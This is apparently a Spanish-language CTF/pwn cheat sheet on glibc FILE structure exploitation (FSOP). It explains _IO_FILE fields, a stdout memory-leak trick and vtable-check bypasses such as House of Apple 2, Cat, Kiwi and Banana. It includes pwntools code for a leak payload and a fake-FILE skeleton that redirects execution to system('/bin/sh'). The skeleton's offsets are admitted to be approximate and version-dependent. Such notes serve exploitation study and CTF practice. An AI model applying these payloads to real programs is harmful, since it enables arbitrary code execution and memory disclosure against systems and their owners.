# FILE / _IO_FILE a fondo y FSOP (cheat sheet)

La struct FILE (_IO_FILE_plus) guarda flags, buffers y una vtable de punteros a funcion. Toda
operacion de IO (fwrite/fread/fclose/fflush/puts/printf con buffer) pasa por esa vtable ->
corromperla da control. Complementa [[modern-heap]].

## Campos clave de _IO_FILE
- _flags (offset 0): bits de estado (magic 0xFBAD0000 | flags). Manipularlo cambia el
  comportamiento de lectura/escritura del stream.
- _IO_read_ptr/base/end, _IO_write_ptr/base/end (buffers).
- _chain: siguiente FILE (lista _IO_list_all).
- _fileno: fd. _lock: puntero al lock. vtable (al final, _IO_jump_t).
- _wide_data: datos de streams de caracteres anchos (clave en House of Apple 2).

## Leak via _IO_2_1_stdout_
Trucar los flags y punteros de stdout para que el proximo output filtre memoria:
- set `_flags = 0xfbad1800` (o 0xfbad1887) y pon `_IO_write_base` apuntando "mas atras" (p.ej.
  a una direccion de libc en la propia struct) y `_IO_write_end` mas lejos -> al hacer flush,
  glibc escribe TODO ese rango a stdout -> leak enorme de libc/heap.
- Muy usado tras un overlap de tcache con `_IO_2_1_stdout_`.

## FSOP: disparar la vtable
Al hacer fwrite/fflush/exit(->_IO_flush_all_lockp), glibc recorre _IO_list_all y llama
`vtable->__overflow(fp)` etc. Si controlas fp y su vtable, controlas rip.
- Mitigacion moderna: `_IO_vtable_check` exige que la vtable este dentro de __libc_IO_vtables.
  Una vtable en heap falla.

## Bypass del vtable check (glibc 2.24+ / 2.35+)
- House of Orange (viejo): abusa de _IO_list_all + fake FILE con vtable a system (pre-check).
- House of Apple 2 (2.35+): via _wide_data->_wide_vtable (el anidado NO se valida). Cadena:
  `_IO_wfile_xsputn -> _IO_wfile_overflow -> _IO_wdoallocbuf -> call [_wide_data->_wide_vtable
  + 0x68]` con system/one_gadget.
- House of Cat: usa _IO_wfile_jumps + _wide_data para saltar a un gadget controlado (similar
  filosofia, otra cadena; util cuando controlas rdx).
- House of Kiwi: abusa de __malloc_assert -> _IO_flush_all para forzar la cadena FSOP incluso
  sin exit explicito.
- House of Banana: corrompe _dl_fini / rtld_global (_IO/link_map) para RCE al salir.

## Ejemplo pwntools: leak por stdout (FileStructure)
```python
from pwn import *
context.arch = "amd64"
# pwntools trae un constructor de _IO_FILE con el truco de leak ya montado:
fs = FileStructure(null=0)
payload = fs.leak(addr=libc_base, length=0x8)   # filtra 8 bytes de esa direccion por stdout
# ...escribe 'payload' sobre _IO_2_1_stdout_ (p.ej. tras un overlap de tcache) y provoca un flush.
# Equivalente manual: _flags=0xfbad1800, _IO_write_base=addr, _IO_write_end=addr+len,
#                     _IO_read_end=_IO_write_base (para que no re-lea el buffer).
```

## Ejemplo pwntools: House of Apple 2 (glibc 2.35+, esqueleto)
Necesita leak de libc y una direccion conocida `fp` donde vive el fake FILE (p.ej. en heap).
La cadena entra por `_IO_wfile_overflow` y termina en `call [_wide_data->_wide_vtable + 0x68]`
con `rdi = fp`; por eso `system` y la string van relativos a `fp`.
```python
fp  = fake_file_addr            # direccion (conocida) del fake FILE
wd  = fp + 0xe8                 # colocamos _wide_data apuntando dentro del mismo fake FILE
# offsets de _IO_FILE_plus (x86-64):
f  = p64(0)                     # 0x00 _flags: 0 pasa el check de wfile_overflow
f += p64(0)                     # 0x08 _IO_read_ptr
f += p64(0)                     # 0x10 _IO_read_end
f += p64(0)                     # 0x18 _IO_read_base
f += p64(0)                     # 0x20 _IO_write_base
f += p64(1)                     # 0x28 _IO_write_ptr  (> write_base -> entra en overflow)
f  = f.ljust(0xa0, b"\x00")
f += p64(wd)                    # 0xa0 _wide_data -> struct controlada (aqui, wd)
f  = f.ljust(0xc0, b"\x00")
f += p64(0)                     # 0xc0 _mode: 0
f  = f.ljust(0xd8, b"\x00")
f += p64(libc.sym["_IO_wfile_jumps"])   # 0xd8 vtable: SI valida (esta en __libc_IO_vtables)
# _wide_data (en wd = fp+0xe8): su _wide_vtable (offset 0xe8) apunta a una tabla falsa cuyo
# slot +0x68 es system; el _wide_vtable puede solaparse con el propio fake FILE.
f += p64(0)*3                   # relleno hasta wd
# wd->_wide_vtable en wd+0xe8; ponlo a (fp) y coloca system en fp+0x68, y "/bin/sh" en fp+0..
# Detalle exacto de offsets: verifica con pwndbg 'p &((struct _IO_wide_data*)0)->_wide_vtable'.
```
Nota honesta: este esqueleto es una PLANTILLA; los offsets de `_wide_data`/`_wide_vtable`
cambian entre versiones de glibc. Ajusta con la struct real del binario objetivo y valida en
gdb antes de darlo por bueno (grounded > generated). Alternativas mas simples si aplican:
House of Kiwi (arb write + __malloc_assert) o corromper `_IO_2_1_stdout_` para leak primero.

## Requisitos generales
- fake FILE en memoria conocida (heap con leak), o overwrite de un FILE real.
- leak de libc (para vtable/system) salvo variantes leakless.
- que el programa haga IO o salga (para disparar la cadena).
